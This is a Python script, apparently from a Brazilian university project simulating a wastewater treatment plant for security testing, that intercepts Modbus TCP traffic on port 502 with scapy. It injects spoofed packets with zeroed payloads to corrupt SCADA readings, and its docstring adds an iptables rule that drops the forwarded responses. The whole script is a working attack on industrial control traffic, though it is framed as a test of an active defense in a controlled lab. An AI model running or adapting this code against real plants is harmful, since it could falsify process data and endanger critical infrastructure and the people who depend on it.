"""
Carga Maliciosa Complementar - Corrupção de Pacotes Modbus
===========================================================
Projeto: Simulador Virtual de ETE para Análise de Segurança Cibernética
Autora:  Leticia dos Santos Matos (PIBIT/UNIFEI 2025)
Fonte:   Relatório de Mitigação (fev-mar/2026)

Descrição:
    Script complementar usado nos testes de validação da Defesa Ativa.
    Inunda a conexão Modbus com pacotes vazios (payload zerado) quando o
    firewall do atacante captura tráfego da porta 502.
    Usado em conjunto com defesa_ativa.py para validar que a defesa
    neutraliza a corrupção de pacotes.

    Quando a Defesa Ativa está ATIVA: o tráfego viaja nativamente pela
    camada de hardware, desviando do container atacante. Este script
    não consegue capturar pacotes -> FUXA mantém leitura estável.

    Configuração (Terminal 5 do protocolo de 5 terminais):
        iptables -A FORWARD -p tcp --sport 502 -j DROP
        python3 attack_simple.py

    ATENÇÃO: Para uso exclusivo em ambiente de pesquisa controlado.

Dependências: pip install scapy
"""

from scapy.all import IP, TCP, Raw, sniff, send


def corromper(pacote):
    """Intercepta pacotes Modbus e envia versão corrompida (payload zerado)."""
    if pacote.haslayer(TCP) and pacote[TCP].sport == 502:
        # Cria payload vazio de 12 bytes
        mentira = b'\x00' * 12

        pacote_falso = (
            IP(src=pacote[IP].src, dst=pacote[IP].dst)
            / TCP(
                sport=pacote[TCP].sport,
                dport=pacote[TCP].dport,
                seq=pacote[TCP].seq,
                ack=pacote[TCP].ack,
                flags="PA",
            )
            / mentira
        )

        send(pacote_falso, count=3, verbose=0)


print("[*] Ataque Simples Ativo: Corrompendo leituras do Fuxa na porta 502...")
sniff(filter="tcp port 502", prn=corromper, store=0)
